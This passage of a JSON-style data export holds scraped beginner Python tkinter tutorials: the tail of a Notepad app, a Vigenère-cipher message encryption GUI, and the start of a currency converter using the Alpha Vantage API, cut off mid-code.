u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Scrollbar will adjust automatically according to the content\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__thisScrollBar.config(command=self.__thisTextArea.yview)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__thisTextArea.config(yscrollcommand=self.__thisScrollBar.set)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def __quitApplication(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__root.destroy()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# exit()\u00a0\u00a0\u00a0\u00a0\u00a0def __showAbout(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0showinfo(\"Notepad\",\"Mrinal Verma\")\u00a0\u00a0\u00a0\u00a0\u00a0def __openFile(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__file = askopenfilename(defaultextension=\".txt\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0filetypes=[(\"All Files\",\"*.*\"),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0(\"Text Documents\",\"*.txt\")])\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if self.__file == \"\":\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# no file to open\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__file = None\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Try to open the file\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# set the window title\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__root.title(os.path.basename(self.__file) + \" - Notepad\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__thisTextArea.delete(1.0,END)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0file = open(self.__file,\"r\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__thisTextArea.insert(1.0,file.read())\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0file.close()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def __newFile(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__root.title(\"Untitled - Notepad\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__file = None\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__thisTextArea.delete(1.0,END)\u00a0\u00a0\u00a0\u00a0\u00a0def __saveFile(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if self.__file == None:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Save as new file\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__file = asksaveasfilename(initialfile='Untitled.txt',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0defaultextension=\".txt\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0filetypes=[(\"All Files\",\"*.*\"),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0(\"Text Documents\",\"*.txt\")])\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if self.__file == \"\":\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__file = None\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Try to save the file\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0file = open(self.__file,\"w\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0file.write(self.__thisTextArea.get(1.0,END))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0file.close()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Change the window title\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__root.title(os.path.basename(self.__file) + \" - Notepad\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0file = open(self.__file,\"w\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0file.write(self.__thisTextArea.get(1.0,END))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0file.close()\u00a0\u00a0\u00a0\u00a0\u00a0def __cut(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__thisTextArea.event_generate(\"<<Cut>>\")\u00a0\u00a0\u00a0\u00a0\u00a0def __copy(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__thisTextArea.event_generate(\"<<Copy>>\")\u00a0\u00a0\u00a0\u00a0\u00a0def __paste(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__thisTextArea.event_generate(\"<<Paste>>\")\u00a0\u00a0\u00a0\u00a0\u00a0def run(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Run main application\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__root.mainloop()\u00a0\u00a0\u00a0\u00a0# Run main applicationnotepad = Notepad(width=600,height=400)notepad.run()To run this code, save it by the extension .py and then open cmd(command prompt) and move to the location of the file saved and then write the following\u00a0python \"filename\".py and press enter and it will run. Or can be run directly by simply double clicking your .py extension file.\u00a0\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "6d295bedba27350e10628d08bf616e60",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Prerequisite : Basics of TkinterPython offers multiple options for developing GUI (Graphical User Interface). Out of all the GUI methods, tkinter is most commonly used method. It is a standard Python interface to the Tk GUI toolkit shipped with Python. Python with tkinter outputs the fastest and easiest way to create the GUI applications.\u00a0Python provides the Tkinter toolkit to develop GUI applications. Now, it\u2019s upto the imagination or necessity of developer, what he/she want to develop using this toolkit. Let\u2019s try to implement a message encryption-decryption application according to the Vigen\u00e8re cipher, which can encrypt the message using the key and can decrypt the encrypted hash using same key.\u00a0Modules used in the project :\n\nTkinter  -> GUI toolkittime datetime  base64   -> Vigen\u00e8re cipherBelow is the implementation of above idea :\u00a0\u00a0Python3# import tkinter modulefrom tkinter import *\u00a0# import other necessary modulesimport randomimport timeimport datetime\u00a0# creating root objectroot = Tk()\u00a0# defining size of windowroot.geometry(\"1200x6000\")\u00a0# setting up the title of windowroot.title(\"Message Encryption and Decryption\")\u00a0Tops = Frame(root, width = 1600, relief = SUNKEN)Tops.pack(side = TOP)\u00a0f1 = Frame(root, width = 800, height = 700,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0relief = SUNKEN)f1.pack(side = LEFT)\u00a0# ==============================================#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 TIME# ==============================================localtime = time.asctime(time.localtime(time.time()))\u00a0lblInfo = Label(Tops, font = ('helvetica', 50, 'bold'),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0text = \"SECRET MESSAGING \\n Vigen\u00e8re cipher\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0fg = \"Black\", bd = 10, anchor='w')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0lblInfo.grid(row = 0, column = 0)\u00a0lblInfo = Label(Tops, font=('arial', 20, 'bold'),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0text = localtime, fg = \"Steel Blue\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0bd = 10, anchor = 'w')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0lblInfo.grid(row = 1, column = 0)\u00a0rand = StringVar()Msg = StringVar()key = StringVar()mode = StringVar()Result = StringVar()\u00a0# exit functiondef qExit():\u00a0\u00a0\u00a0\u00a0root.destroy()\u00a0# Function to reset the windowdef Reset():\u00a0\u00a0\u00a0\u00a0rand.set(\"\")\u00a0\u00a0\u00a0\u00a0Msg.set(\"\")\u00a0\u00a0\u00a0\u00a0key.set(\"\")\u00a0\u00a0\u00a0\u00a0mode.set(\"\")\u00a0\u00a0\u00a0\u00a0Result.set(\"\")\u00a0\u00a0# referencelblReference = Label(f1, font = ('arial', 16, 'bold'),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0text = \"Name:\", bd = 16, anchor = \"w\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0lblReference.grid(row = 0, column = 0)\u00a0txtReference = Entry(f1, font = ('arial', 16, 'bold'),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0textvariable = rand, bd = 10, insertwidth = 4,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0bg = \"powder blue\", justify = 'right')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0txtReference.grid(row = 0, column = 1)\u00a0# labelslblMsg = Label(f1, font = ('arial', 16, 'bold'),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0text = \"MESSAGE\", bd = 16, anchor = \"w\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0lblMsg.grid(row = 1, column = 0)\u00a0txtMsg = Entry(f1, font = ('arial', 16, 'bold'),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0textvariable = Msg, bd = 10, insertwidth = 4,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0bg = \"powder blue\", justify = 'right')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0txtMsg.grid(row = 1, column = 1)\u00a0lblkey = Label(f1, font = ('arial', 16, 'bold'),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0text = \"KEY\", bd = 16, anchor = \"w\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0lblkey.grid(row = 2, column = 0)\u00a0txtkey = Entry(f1, font = ('arial', 16, 'bold'),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0textvariable = key, bd = 10, insertwidth = 4,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0bg = \"powder blue\", justify = 'right')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0txtkey.grid(row = 2, column = 1)\u00a0lblmode = Label(f1, font = ('arial', 16, 'bold'),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0text = \"MODE(e for encrypt, d for decrypt)\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0bd = 16, anchor = \"w\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0lblmode.grid(row = 3, column = 0)\u00a0txtmode = Entry(f1, font = ('arial', 16, 'bold'),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0textvariable = mode, bd = 10, insertwidth = 4,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0bg = \"powder blue\", justify = 'right')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0txtmode.grid(row = 3, column = 1)\u00a0lblService = Label(f1, font = ('arial', 16, 'bold'),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0text = \"The Result-\", bd = 16, anchor = \"w\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0lblService.grid(row = 2, column = 2)\u00a0txtService = Entry(f1, font = ('arial', 16, 'bold'),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0textvariable = Result, bd = 10, insertwidth = 4,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0bg = \"powder blue\", justify = 'right')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0txtService.grid(row = 2, column = 3)\u00a0# Vigen\u00e8re cipherimport base64\u00a0# Function to encodedef encode(key, clear):\u00a0\u00a0\u00a0\u00a0enc = []\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for i in range(len(clear)):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0key_c = key[i % len(key)]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0enc_c = chr((ord(clear[i]) +\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ord(key_c)) % 256)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0enc.append(enc_c)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return base64.urlsafe_b64encode(\"\".join(enc).encode()).decode()\u00a0# Function to decodedef decode(key, enc):\u00a0\u00a0\u00a0\u00a0dec = []\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0enc = base64.urlsafe_b64decode(enc).decode()\u00a0\u00a0\u00a0\u00a0for i in range(len(enc)):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0key_c = key[i % len(key)]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0dec_c = chr((256 + ord(enc[i]) -\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ord(key_c)) % 256)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0dec.append(dec_c)\u00a0\u00a0\u00a0\u00a0return \"\".join(dec)\u00a0\u00a0def Ref():\u00a0\u00a0\u00a0\u00a0print(\"Message= \", (Msg.get()))\u00a0\u00a0\u00a0\u00a0\u00a0clear = Msg.get()\u00a0\u00a0\u00a0\u00a0k = key.get()\u00a0\u00a0\u00a0\u00a0m = mode.get()\u00a0\u00a0\u00a0\u00a0\u00a0if (m == 'e'):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Result.set(encode(k, clear))\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Result.set(decode(k, clear))\u00a0# Show message buttonbtnTotal = Button(f1, padx = 16, pady = 8, bd = 16, fg = \"black\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0font = ('arial', 16, 'bold'), width = 10,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0text = \"Show Message\", bg = \"powder blue\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command = Ref).grid(row = 7, column = 1)\u00a0# Reset buttonbtnReset = Button(f1, padx = 16, pady = 8, bd = 16,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0fg = \"black\", font = ('arial', 16, 'bold'),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0width = 10, text = \"Reset\", bg = \"green\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command = Reset).grid(row = 7, column = 2)\u00a0# Exit buttonbtnExit = Button(f1, padx = 16, pady = 8, bd = 16,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0fg = \"black\", font = ('arial', 16, 'bold'),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0width = 10, text = \"Exit\", bg = \"red\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command = qExit).grid(row = 7, column = 3)\u00a0# keeps window aliveroot.mainloop()Output :\u00a0Encrypt Window \u2013\u00a0\u00a0Decrypt Window \u2013\u00a0\u00a0\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "f65ebd03d6b4e0bb50152985611c9e66",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Prerequisites : Introduction to tkinter | Get the real time currency exchange ratePython offers multiple options for developing GUI (Graphical User Interface). Out of all the GUI methods, tkinter is the most commonly used method. It is a standard Python interface to the Tk GUI toolkit shipped with Python. Python with tkinter outputs the fastest and easiest way to create the GUI applications.\u00a0To create a tkinter :\u00a0Importing the module \u2013 tkinterCreate the main window (container)Add any number of widgets to the main window.Apply the event Trigger on the widgets.Let\u2019s create a GUI based simple Real-time currency convertor (Using Alpha Vantage API) which can convert amounts from one currency to another currency.Modules required:\u00a0\u00a0tkinter\nrequests\njsonBelow is the implementation :\u00a0Python3# import all functions from the tkinterfrom tkinter import *\u00a0# Create a GUI windowroot = Tk()\u00a0# create a global variablesvariable1 = StringVar(root)variable2 = StringVar(root)\u00a0# initialise the variablesvariable1.set(\"currency\")variable2.set(\"currency\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Function to perform real time conversion# from one currency to another currencydef RealTimeCurrencyConversion():\u00a0\u00a0\u00a0\u00a0\u00a0# importing required libraries\u00a0\u00a0\u00a0\u00a0import requests, json\u00a0\u00a0\u00a0\u00a0\u00a0# currency code\u00a0\u00a0\u00a0\u00a0from_currency = variable1.get()\u00a0\u00a0\u00a0\u00a0to_currency = variable2.get()\u00a0\u00a0\u00a0\u00a0\u00a0# enter your api key here\u00a0\u00a0\u00a0\u00a0api_key = \"Your_Api_Key\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# base_url variable store base url\u00a0\u00a0\u00a0\u00a0base_url = r\"https://www.alphavantage.co/query?function = CURRENCY_EXCHANGE_RATE\"\u00a0\u00a0\u00a0\u00a0\u00a0# main_url variable store complete url\u00a0\u00a0\u00a0\u00a0main_url = base_url + \"&from_currency =\" + from_currency +\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"&to_currency =\" + to_currency + \"&apikey =\" + api_key\u00a0\u00a0\u00a0\u00a0\u00a0# get method of requests module\u00a0\u00a0\u00a0\u00a0# return response object\u00a0\u00a0\u00a0\u00a0req_ob = requests.get(main_url)\u00a0\u00a0\u00a0\u00a0\u00a0# json method return json format\u00a0\u00a0\u00a0\u00a0# data into python dictionary data type.\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# result contains list of nested dictionaries\u00a0\u00a0\u00a0\u00a0result = req_ob.json()\u00a0\u00a0\u00a0\u00a0\u00a0# parsing the required information\u00a0\u00a0\u00a0\u00a0Exchange_Rate = float(result[\"Realtime Currency Exchange Rate\"]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0['5. Exchange Rate'])\u00a0\u00a0\u00a0\u00a0\u00a0# get method of Entry 